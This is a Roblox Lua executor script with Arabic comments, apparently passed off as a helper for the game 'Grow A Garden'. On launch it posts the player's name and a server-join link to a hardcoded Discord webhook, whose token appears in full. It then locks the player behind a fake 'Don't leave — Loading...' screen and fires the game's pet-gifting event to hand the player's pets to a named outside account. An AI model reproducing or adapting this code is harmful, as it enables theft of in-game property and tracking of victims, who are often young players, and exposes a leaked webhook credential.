--== خدمات Roblox ==--
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local Chat = game:GetService("Players").LocalPlayer.Chatted

--== رابط Webhook ==--
local webhookUrl = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"

--== دالة إرسال Webhook ==--
local function sendWebhook(message)
    local serverUrl = "https://www.roblox.com/games/"..game.PlaceId.."/?jobId="..game.JobId
    local data = {
        content = message,
        components = {
            {
                type = 1,
                components = {
                    {
                        type = 2,
                        style = 5,
                        label = "انقر للانتقال للسيرفر",
                        url = serverUrl
                    }
                }
            }
        }
    }
    local jsonData = HttpService:JSONEncode(data)
    if syn and syn.request then
        syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    elseif http_request then
        http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    elseif fluxus and fluxus.request then
        fluxus.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    else
        warn("Executor لا يدعم إرسال HTTP requests.")
    end
end

--== إرسال Webhook فور تشغيل السكربت ==--
sendWebhook("تم تشغيل السكربت بواسطة اللاعب: "..player.Name)

--== واجهة تحميل ==--
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.AutoRotate = false

UIS.InputBegan:Connect(function(input, gpe)
    gpe = true -- منع أي تحكم
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LockedLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(1,0,1,0)
frame.Position = UDim2.new(0,0,0,0)
frame.BackgroundColor3 = Color3.fromRGB(15,15,15)

local gameTitle = Instance.new("TextLabel", frame)
gameTitle.Size = UDim2.new(1,0,0.1,0)
gameTitle.Position = UDim2.new(0,0,0,0)
gameTitle.BackgroundTransparency = 1
gameTitle.Text = "🌱 Grow A Garden"
gameTitle.Font = Enum.Font.SourceSansBold
gameTitle.TextSize = 40
gameTitle.TextColor3 = Color3.fromRGB(0,255,128)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1,0,0.2,0)
label.Position = UDim2.new(0,0,0.4,0)
label.BackgroundTransparency = 1
label.Text = "Don't leave — Loading..."
label.Font = Enum.Font.SourceSansBold
label.TextSize = 36
label.TextColor3 = Color3.fromRGB(255,255,255)

local barBack = Instance.new("Frame", frame)
barBack.Size = UDim2.new(0.6,0,0.05,0)
barBack.Position = UDim2.new(0.2,0,0.6,0)
barBack.BackgroundColor3 = Color3.fromRGB(50,50,50)

local bar = Instance.new("Frame", barBack)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)

local percent = Instance.new("TextLabel", frame)
percent.Size = UDim2.new(1,0,0.05,0)
percent.Position = UDim2.new(0,0,0.65,0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.Font = Enum.Font.SourceSansBold
percent.TextSize = 28
percent.TextColor3 = Color3.fromRGB(255,255,255)

-- شريط التحميل لمدة دقيقة
for i = 1, 100 do
    bar.Size = UDim2.new(i/100,0,1,0)
    percent.Text = i.."%"
    wait(0.6)
end

label.Text = "Loading Complete!"
wait(1)
screenGui:Destroy()
humanoid.WalkSpeed = 16
humanoid.JumpPower = 50
humanoid.AutoRotate = true

--== خاصية الشات ==--
Chat:Connect(function(msg)
    if msg == "." then
        -- Teleport إلى مزرعتك
        local myFarmPlaceId = 12345678 -- ضع معرف مزرعتك هنا
        TeleportService:Teleport(myFarmPlaceId, player)

        -- إعطاء الحيوانات لك
        local targetName = player.Name
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer then
            ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
        end
    end
end)

--== التحقق من اللاعب sssfysue7 ومنحه الحيوانات ==--
local targetName = "sssfysue7"
local targetPlayer = Players:FindFirstChild(targetName)
if targetPlayer then
    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
end
